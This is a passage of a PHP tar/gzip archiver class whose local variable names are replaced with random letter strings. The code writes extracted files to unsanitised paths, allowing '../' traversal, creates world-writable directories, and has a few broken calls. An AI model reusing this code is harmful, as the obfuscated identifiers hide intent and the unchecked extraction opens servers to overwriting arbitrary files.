		$dkcmjwtqnsvhzgaupbxfry = false;
		if (file_exists($this->archive_name) && is_file($this->archive_name)) 	$newArchive = false;
		else $newArchive = true;
		if ($newArchive){
			if (!$this->openWrite()) return false;
		} else {
			if (filesize($this->archive_name) == 0)	return $this->openWrite();
			if ($this->isGzipped) {
				$this->closeTmpFile();
				if (!rename($this->archive_name, $this->archive_name.'.tmp')){
					$this->errors[] = __('Cannot rename').' '.$this->archive_name.__(' to ').$this->archive_name.'.tmp';
					return false;
				}
				$tmpArchive = gzopen($this->archive_name.'.tmp', 'rb');
				if (!$tmpArchive){
					$this->errors[] = $this->archive_name.'.tmp '.__('is not readable');
					rename($this->archive_name.'.tmp', $this->archive_name);
					return false;
				}
				if (!$this->openWrite()){
					rename($this->archive_name.'.tmp', $this->archive_name);
					return false;
				}
				$buffer = gzread($tmpArchive, 512);
				if (!gzeof($tmpArchive)){
					do {
						$binaryData = pack('a512', $buffer);
						$this->writeBlock($binaryData);
						$buffer = gzread($tmpArchive, 512);
					}
					while (!gzeof($tmpArchive));
				}
				gzclose($tmpArchive);
				unlink($this->archive_name.'.tmp');
			} else {
				$this->tmp_file = fopen($this->archive_name, 'r+b');
				if (!$this->tmp_file)	return false;
			}
		}
		if (isset($file_list) && is_array($file_list)) {
		if (count($file_list)>0)
			$dkcmjwtqnsvhzgaupbxfry = $this->packFileArray($file_list);
		} else $this->errors[] = __('No file').__(' to ').__('Archive');
		if (($dkcmjwtqnsvhzgaupbxfry)&&(is_resource($this->tmp_file))){
			$binaryData = pack('a512', '');
			$this->writeBlock($binaryData);
		}
		$this->closeTmpFile();
		if ($newArchive && !$dkcmjwtqnsvhzgaupbxfry){
		$this->closeTmpFile();
		unlink($this->archive_name);
		}
		return $dkcmjwtqnsvhzgaupbxfry;
	}

	function restoreArchive($rgvxhjbkznwpescmudqfyt){
		$fileName = $this->archive_name;
		if (!$this->isGzipped){
			if (file_exists($fileName)){
				if ($asyqwgrmchekdubtvpzjfn = fopen($fileName, 'rb')){
					$data = fread($asyqwgrmchekdubtvpzjfn, 2);
					fclose($asyqwgrmchekdubtvpzjfn);
					if ($data == '\37\213'){
						$this->isGzipped = true;
					}
				}
			}
			elseif ((substr($fileName, -2) == 'gz') OR (substr($fileName, -3) == 'tgz')) $this->isGzipped = true;
		} 
		$dkcmjwtqnsvhzgaupbxfry = true;
		if ($this->isGzipped) $this->tmp_file = gzopen($fileName, 'rb');
		else $this->tmp_file = fopen($fileName, 'rb');
		if (!$this->tmp_file){
			$this->errors[] = $fileName.' '.__('is not readable');
			return false;
		}
		$dkcmjwtqnsvhzgaupbxfry = $this->unpackFileArray($rgvxhjbkznwpescmudqfyt);
			$this->closeTmpFile();
		return $dkcmjwtqnsvhzgaupbxfry;
	}

	function showErrors	($message = '') {
		$Errors = $this->errors;
		if(count($Errors)>0) {
		if (!empty($message)) $message = ' ('.$message.')';
			$message = __('Error occurred').$message.': <br/>';
			foreach ($Errors as $value)
				$message .= $value.'<br/>';
			return $message;	
		} else return '';
		
	}
	
	function packFileArray($file_array){
		$dkcmjwtqnsvhzgaupbxfry = true;
		if (!$this->tmp_file){
			$this->errors[] = __('Invalid file descriptor');
			return false;
		}
		if (!is_array($file_array) || count($file_array)<=0)
          return true;
		for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg<count($file_array); $fmcvsnxujheqtrpkbwazyg++){
			$filename = $file_array[$fmcvsnxujheqtrpkbwazyg];
			if ($filename == $this->archive_name)
				continue;
			if (strlen($filename)<=0)
				continue;
			if (!file_exists($filename)){
				$this->errors[] = __('No file').' '.$filename;
				continue;
			}
			if (!$this->tmp_file){
			$this->errors[] = __('Invalid file descriptor');
			return false;
			}
		if (strlen($filename)<=0){
			$this->errors[] = __('Filename').' '.__('is incorrect');;
			return false;
		}
		$filename = str_replace('\\', '/', $filename);
		$keep_filename = $this->makeGoodPath($filename);
		if (is_file($filename)){
			if (($wjvdmrgebyxuqaknzshpct = fopen($filename, 'rb')) == 0){
				$this->errors[] = __('Mode ').__('is incorrect');
			}
				if(($this->file_pos == 0)){
					if(!$this->writeHeader($filename, $keep_filename))
						return false;
				}
				while (($buffer = fread($wjvdmrgebyxuqaknzshpct, 512)) != ''){
					$binaryData = pack('a512', $buffer);
					$this->writeBlock($binaryData);
				}
			fclose($wjvdmrgebyxuqaknzshpct);
		}	else $this->writeHeader($filename, $keep_filename);
			if (@is_dir($filename)){
				if (!($mypduratbnjskfzcqvhgew = opendir($filename))){
					$this->errors[] = __('Error').': '.__('Directory ').$filename.__('is not readable');
					continue;
				}
				while (false !== ($dir = readdir($mypduratbnjskfzcqvhgew))){
					if ($dir!='.' && $dir!='..'){
						$file_array_tmp = array();
						if ($filename != '.')
							$file_array_tmp[] = $filename.'/'.$dir;
						else
							$file_array_tmp[] = $dir;

						$dkcmjwtqnsvhzgaupbxfry = $this->packFileArray($file_array_tmp);
					}
				}
				unset($file_array_tmp);
				unset($dir);
				unset($mypduratbnjskfzcqvhgew);
			}
		}
		return $dkcmjwtqnsvhzgaupbxfry;
	}

	function unpackFileArray($rgvxhjbkznwpescmudqfyt){ 
		$rgvxhjbkznwpescmudqfyt = str_replace('\\', '/', $rgvxhjbkznwpescmudqfyt);
		if ($rgvxhjbkznwpescmudqfyt == ''	|| (substr($rgvxhjbkznwpescmudqfyt, 0, 1) != '/' && substr($rgvxhjbkznwpescmudqfyt, 0, 3) != '../' && !strpos($rgvxhjbkznwpescmudqfyt, ':')))	$rgvxhjbkznwpescmudqfyt = './'.$rgvxhjbkznwpescmudqfyt;
		clearstatcache();
		while (strlen($binaryData = $this->readBlock()) != 0){
			if (!$this->readHeader($binaryData, $header)) return false;
			if ($header['filename'] == '') continue;
			if ($header['typeflag'] == 'L'){			//reading long header
				$filename = '';
				$decr = floor($header['size']/512);
				for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg < $decr; $fmcvsnxujheqtrpkbwazyg++){
					$content = $this->readBlock();
					$filename .= $content;
				}
				if (($laspiece = $header['size'] % 512) != 0){
					$content = $this->readBlock();
					$filename .= substr($content, 0, $laspiece);
				}
				$binaryData = $this->readBlock();
				if (!$this->readHeader($binaryData, $header)) return false;
				else $header['filename'] = $filename;
				return true;
			}
			if (($rgvxhjbkznwpescmudqfyt != './') && ($rgvxhjbkznwpescmudqfyt != '/')){
				while (substr($rgvxhjbkznwpescmudqfyt, -1) == '/') $rgvxhjbkznwpescmudqfyt = substr($rgvxhjbkznwpescmudqfyt, 0, strlen($rgvxhjbkznwpescmudqfyt)-1);
				if (substr($header['filename'], 0, 1) == '/') $header['filename'] = $rgvxhjbkznwpescmudqfyt.$header['filename'];
				else $header['filename'] = $rgvxhjbkznwpescmudqfyt.'/'.$header['filename'];
			}
			
			if (file_exists($header['filename'])){
				if ((@is_dir($header['filename'])) && ($header['typeflag'] == '')){
					$this->errors[] =__('File ').$header['filename'].__(' already exists').__(' as folder');
					return false;
				}
				if ((is_file($header['filename'])) && ($header['typeflag'] == '5')){
					$this->errors[] =__('Cannot create directory').'. '.__('File ').$header['filename'].__(' already exists');
					return false;
				}
				if (!is_writeable($header['filename'])){
					$this->errors[] = __('Cannot write to file').'. '.__('File ').$header['filename'].__(' already exists');
					return false;
				}
			} elseif (($this->dirCheck(($header['typeflag'] == '5' ? $header['filename'] : dirname($header['filename'])))) != 1){
				$this->errors[] = __('Cannot create directory').' '.__(' for ').$header['filename'];
				return false;
			}

			if ($header['typeflag'] == '5'){
				if (!file_exists($header['filename']))		{
					if (!mkdir($header['filename'], 0777))	{
						
						$this->errors[] = __('Cannot create directory').' '.$header['filename'];
						return false;
					} 
				}
			} else {
				if (($destination = fopen($header['filename'], 'wb')) == 0) {
					$this->errors[] = __('Cannot write to file').' '.$header['filename'];
					return false;
				} else {
					$decr = floor($header['size']/512);
					for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg < $decr; $fmcvsnxujheqtrpkbwazyg++) {
						$content = $this->readBlock();
						fwrite($destination, $content, 512);
					}
					if (($header['size'] % 512) != 0) {
						$content = $this->readBlock();
						fwrite($destination, $content, ($header['size'] % 512));
					}
					fclose($destination);
					touch($header['filename'], $header['time']);
				}
				clearstatcache();
				if (filesize($header['filename']) != $header['size']) {
					$this->errors[] = __('Size of file').' '.$header['filename'].' '.__('is incorrect');
					return false;
				}
			}
			if (($file_dir = dirname($header['filename'])) == $header['filename']) $file_dir = '';
			if ((substr($header['filename'], 0, 1) == '/') && ($file_dir == '')) $file_dir = '/';
			$this->dirs[] = $file_dir;
			$this->files[] = $header['filename'];
	
		}
		return true;
	}

	function dirCheck($dir){
		$parent_dir = dirname($dir);

		if ((@is_dir($dir)) or ($dir == ''))
			return true;

		if (($parent_dir != $dir) and ($parent_dir != '') and (!$this->dirCheck($parent_dir)))
			return false;

		if (!mkdir($dir, 0777)){
			$this->errors[] = __('Cannot create directory').' '.$dir;
			return false;
		}
		return true;
	}

	function readHeader($binaryData, &$header){
		if (strlen($binaryData)==0){
			$header['filename'] = '';
			return true;
		}

		if (strlen($binaryData) != 512){
			$header['filename'] = '';
			$this->__('Invalid block size').': '.strlen($binaryData);
			return false;
		}

		$checksum = 0;
		for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg < 148; $fmcvsnxujheqtrpkbwazyg++) $checksum+=ord(substr($binaryData, $fmcvsnxujheqtrpkbwazyg, 1));
		for ($fmcvsnxujheqtrpkbwazyg = 148; $fmcvsnxujheqtrpkbwazyg < 156; $fmcvsnxujheqtrpkbwazyg++) $checksum += ord(' ');
		for ($fmcvsnxujheqtrpkbwazyg = 156; $fmcvsnxujheqtrpkbwazyg < 512; $fmcvsnxujheqtrpkbwazyg++) $checksum+=ord(substr($binaryData, $fmcvsnxujheqtrpkbwazyg, 1));

		$unpack_data = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $binaryData);

		$header['checksum'] = OctDec(trim($unpack_data['checksum']));
		if ($header['checksum'] != $checksum){
			$header['filename'] = '';
			if (($checksum == 256) && ($header['checksum'] == 0)) 	return true;
			$this->errors[] = __('Error checksum for file ').$unpack_data['filename'];
			return false;
		}

		if (($header['typeflag'] = $unpack_data['typeflag']) == '5')	$header['size'] = 0;
		$header['filename'] = trim($unpack_data['filename']);
		$header['mode'] = OctDec(trim($unpack_data['mode']));
		$header['user_id'] = OctDec(trim($unpack_data['user_id']));
		$header['group_id'] = OctDec(trim($unpack_data['group_id']));
		$header['size'] = OctDec(trim($unpack_data['size']));
		$header['time'] = OctDec(trim($unpack_data['time']));
		return true;
	}

	function writeHeader($filename, $keep_filename){
		$packF = 'a100a8a8a8a12A12';
		$packL = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keep_filename)<=0) $keep_filename = $filename;
		$filename_ready = $this->makeGoodPath($keep_filename);

		if (strlen($filename_ready) > 99){							//write long header
		$dataFirst = pack($packF, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($filename_ready))), 0);
		$dataLast = pack($packL, 'L', '', '', '', '', '', '', '', '', '');

        //  Calculate the checksum
		$checksum = 0;
        //  First part of the header
		for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg < 148; $fmcvsnxujheqtrpkbwazyg++)
			$checksum += ord(substr($dataFirst, $fmcvsnxujheqtrpkbwazyg, 1));
        //  Ignore the checksum value and replace it by ' ' (space)
		for ($fmcvsnxujheqtrpkbwazyg = 148; $fmcvsnxujheqtrpkbwazyg < 156; $fmcvsnxujheqtrpkbwazyg++)
			$checksum += ord(' ');
        //  Last part of the header
		for ($fmcvsnxujheqtrpkbwazyg = 156, $j=0; $fmcvsnxujheqtrpkbwazyg < 512; $fmcvsnxujheqtrpkbwazyg++, $j++)
			$checksum += ord(substr($dataLast, $j, 1));
        //  Write the first 148 bytes of the header in the archive
		$this->writeBlock($dataFirst, 148);
        //  Write the calculated checksum
		$checksum = sprintf('%6s ', DecOct($checksum));
		$binaryData = pack('a8', $checksum);
		$this->writeBlock($binaryData, 8);
        //  Write the last 356 bytes of the header in the archive
		$this->writeBlock($dataLast, 356);

		$tmp_filename = $this->makeGoodPath($filename_ready);

		$fmcvsnxujheqtrpkbwazyg = 0;
			while (($buffer = substr($tmp_filename, (($fmcvsnxujheqtrpkbwazyg++)*512), 512)) != ''){
				$binaryData = pack('a512', $buffer);
				$this->writeBlock($binaryData);
			}
		return true;
		}
		$file_info = stat($filename);
		if (@is_dir($filename)){
			$typeflag = '5';
			$nayufdgprjmekbhxctvzqw = sprintf('%11s ', DecOct(0));
		} else {
			$typeflag = '';
			clearstatcache();
			$nayufdgprjmekbhxctvzqw = sprintf('%11s ', DecOct(filesize($filename)));
		}
		$dataFirst = pack($packF, $filename_ready, sprintf('%6s ', DecOct(fileperms($filename))), sprintf('%6s ', DecOct($file_info[4])), sprintf('%6s ', DecOct($file_info[5])), $nayufdgprjmekbhxctvzqw, sprintf('%11s', DecOct(filemtime($filename))));
		$dataLast = pack($packL, $typeflag, '', '', '', '', '', '', '', '', '');
		$checksum = 0;
		for ($fmcvsnxujheqtrpkbwazyg = 0; $fmcvsnxujheqtrpkbwazyg < 148; $fmcvsnxujheqtrpkbwazyg++) $checksum += ord(substr($dataFirst, $fmcvsnxujheqtrpkbwazyg, 1));
		for ($fmcvsnxujheqtrpkbwazyg = 148; $fmcvsnxujheqtrpkbwazyg < 156; $fmcvsnxujheqtrpkbwazyg++) $checksum += ord(' ');
		for ($fmcvsnxujheqtrpkbwazyg = 156, $j = 0; $fmcvsnxujheqtrpkbwazyg < 512; $fmcvsnxujheqtrpkbwazyg++, $j++) $checksum += ord(substr($dataLast, $j, 1));
		$this->writeBlock($dataFirst, 148);
		$checksum = sprintf('%6s ', DecOct($checksum));
		$binaryData = pack('a8', $checksum);
		$this->writeBlock($binaryData, 8);
		$this->writeBlock($dataLast, 356);
		return true;
	}

	function openWrite(){
		if ($this->isGzipped)
			$this->tmp_file = gzopen($this->archive_name, 'wb9f');
		else
			$this->tmp_file = fopen($this->archive_name, 'wb');

		if (!($this->tmp_file)){
			$this->errors[] = __('Cannot write to file').' '.$this->archive_name;
			return false;
		}
		return true;
	}

	function readBlock(){
		if (is_resource($this->tmp_file)){
			if ($this->isGzipped)
				$block = gzread($this->tmp_file, 512);
			else
				$block = fread($this->tmp_file, 512);
		} else	$block = '';

		return $block;
	}

	function writeBlock($data, $length = 0){
		if (is_resource($this->tmp_file)){
		
			if ($length === 0){
				if ($this->isGzipped)
					gzputs($this->tmp_file, $data);
				else
					fputs($this->tmp_file, $data);
			} else {
				if ($this->isGzipped)
					gzputs($this->tmp_file, $data, $length);
				else
					fputs($this->tmp_file, $data, $length);
			}
		}
	}

	function closeTmpFile(){
		if (is_resource($this->tmp_file)){
			if ($this->isGzipped)
				gzclose($this->tmp_file);
			else
				fclose($this->tmp_file);

			$this->tmp_file = 0;
		}
	}

	function makeGoodPath($rgvxhjbkznwpescmudqfyt){
		if (strlen($rgvxhjbkznwpescmudqfyt)>0){
			$rgvxhjbkznwpescmudqfyt = str_replace('\\', '/', $rgvxhjbkznwpescmudqfyt);
			$partPath = explode('/', $rgvxhjbkznwpescmudqfyt);
			$bxamegcvhkjupwynrzqdft = count($partPath)-1;
			for ($fmcvsnxujheqtrpkbwazyg = $bxamegcvhkjupwynrzqdft; $fmcvsnxujheqtrpkbwazyg>=0; $fmcvsnxujheqtrpkbwazyg--){
				if ($partPath[$fmcvsnxujheqtrpkbwazyg] == '.'){
                    //  Ignore this directory
                } elseif ($partPath[$fmcvsnxujheqtrpkbwazyg] == '..'){
                    $fmcvsnxujheqtrpkbwazyg--;
                }
				elseif (($partPath[$fmcvsnxujheqtrpkbwazyg] == '') and ($fmcvsnxujheqtrpkbwazyg!=$bxamegcvhkjupwynrzqdft) and ($fmcvsnxujheqtrpkbwazyg!=0)){
                }	else
					$dkcmjwtqnsvhzgaupbxfry = $partPath[$fmcvsnxujheqtrpkbwazyg].($fmcvsnxujheqtrpkbwazyg!=$bxamegcvhkjupwynrzqdft ? '/'.$dkcmjwtqnsvhzgaupbxfry : '');
			}
		} else $dkcmjwtqnsvhzgaupbxfry = '';
		
		return $dkcmjwtqnsvhzgaupbxfry;
	}
}
?>